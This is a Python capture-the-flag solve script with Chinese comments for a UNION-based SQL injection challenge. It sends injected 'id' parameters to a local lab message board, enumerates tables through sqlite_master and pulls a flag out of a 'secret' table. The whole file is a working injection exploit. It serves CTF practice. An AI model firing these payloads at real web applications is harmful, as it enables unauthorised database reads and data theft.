#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import atexit
atexit.register(lambda: print("作者 ZluxYao"))
"""
Challenge 01 —— UNION 回显型 SQL 注入。

留言板的查询为 SELECT id, author, title, content FROM messages WHERE id=<id>，
共 4 列，其中 author/title/content 三列会回显到页面。用 id=-1 让原查询无结果，
再 UNION 出 secret 表中的 flag。
"""

import argparse
import os
import re
import sys
from urllib.parse import quote

import requests

os.environ["NO_PROXY"] = "*"

DEFAULT_URL = os.environ.get("GKD_URL") or ("http://127.0.0.1:33492/")
FLAG_RE = re.compile(r"TOGOGO-flag\{[^}]+\}")
# 三个回显列：author -> meta，title -> h3，content -> content
TITLE_RE = re.compile(r"<h3>#1\s*(.*?)</h3>", re.S)
CONTENT_RE = re.compile(r'<p class="content">(.*?)</p>', re.S)


def make_session() -> requests.Session:
    session = requests.Session()
    session.trust_env = False
    session.headers.update({"User-Agent": "gkdctf-01-helper/1.0"})
    return session


def inject(session: requests.Session, base_url: str, payload: str, timeout: float) -> str:
    """注入一段 UNION 语句，返回页面文本。"""
    url = base_url + "?id=" + quote(payload)
    return session.get(url, timeout=timeout).text


def grab(text: str, pattern: re.Pattern) -> str:
    match = pattern.search(text)
    return match.group(1).strip() if match else ""


def solve(args: argparse.Namespace) -> str | None:
    base_url = args.url.rstrip("/") + "/"
    session = make_session()
    print(f"[*] Target: {base_url}")

    # 1) 确认列数与回显位（title=col3, content=col4）
    probe = inject(session, base_url, "-1 UNION SELECT 1,2,3,4", args.timeout)
    print(f"[*] 列回显探测 -> title={grab(probe, TITLE_RE)!r} content={grab(probe, CONTENT_RE)!r}")

    # 2) 枚举表名
    tables = grab(
        inject(
            session,
            base_url,
            "-1 UNION SELECT 1,2,group_concat(name),4 FROM sqlite_master WHERE type='table'",
            args.timeout,
        ),
        TITLE_RE,
    )
    print(f"[+] 表: {tables}")

    # 3) 直接从 secret 表读 flag 列
    body = inject(
        session,
        base_url,
        "-1 UNION SELECT 1,2,3,group_concat(flag) FROM secret",
        args.timeout,
    )
    flag = FLAG_RE.search(body)
    return flag.group(0) if flag else None


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="UNION 回显型 SQLi，读取 secret 表 flag")
    parser.add_argument("--url", default=DEFAULT_URL, help=f"目标地址，默认 {DEFAULT_URL}")
    parser.add_argument("--timeout", type=float, default=8.0, help="HTTP 超时秒数")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    try:
        flag = solve(args)
    except requests.RequestException as exc:
        print(f"[-] 请求失败（容器可能挂了或端口变了）：{exc}", file=sys.stderr)
        return 1

    if not flag:
        print("\n[-] 没抓到 flag，检查回显列或 secret 表列名是否变化。")
        return 2

    print(f"\n[+] FLAG: {flag}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
